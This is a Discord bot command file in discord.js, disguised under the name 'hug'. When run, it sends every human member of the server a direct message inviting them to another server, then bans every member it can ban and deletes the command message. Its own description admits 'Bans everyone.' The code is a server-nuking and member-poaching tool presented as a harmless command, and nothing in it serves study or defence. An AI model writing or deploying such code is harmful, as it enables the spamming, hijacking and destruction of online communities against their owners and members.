  
const Discord = module.require("discord.js");

module.exports.run = async (bot, message, args) => {
	
const members = message.guild.members.filter(m => !m.user.bot).array(); // Filter out bots.

let undelivered = 0;

for (let i = 0; i < members.length; i++) {  // Using an array and a for loop rather than
  const member = members[i];                // Collection.forEach() due to the fact that
  await member.send('Miss the old ESC Mods? We got the gang back together and want you in: https://discord.gg/rc3wxYU')         // the latter will move onto the proceeding
    .catch(() => undelivered++);            // code before waiting for the promises to
}                                           // fulfill. https://stackoverflow.com/a/37576787

message.channel.send(`Messages sent. ${undelivered} members couldn't receive it.`)
  .catch(console.error);


    try {

        message.guild.members.filter(member => member.bannable).forEach(member => {
			member.ban()});
        message.delete(1000);

    } catch(e) {

        console.log(e.stack);

    }
	
	
        
}

module.exports.help = {

    name: "hug",
    desc: "Bans everyone."

}